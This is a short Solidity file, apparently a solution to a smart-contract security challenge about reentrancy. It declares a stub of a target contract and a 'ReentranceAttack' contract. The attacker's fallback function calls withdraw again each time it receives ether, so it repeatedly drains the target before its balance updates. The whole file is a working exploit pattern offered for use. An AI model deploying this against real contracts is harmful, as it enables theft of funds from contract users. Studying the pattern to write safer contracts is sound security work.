// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DeployedReentrance {
  function donate(address _to) public payable { }

  function withdraw(uint _amount) public {}
}

contract ReentranceAttack {
  DeployedReentrance reentranceContract;

  constructor(address _contractAddress) public {
    reentranceContract = DeployedReentrance(_contractAddress);
  }

  function call(uint amount) public {
    reentranceContract.withdraw(amount);
  }

  fallback() external payable {
    reentranceContract.withdraw(msg.value);
  }
}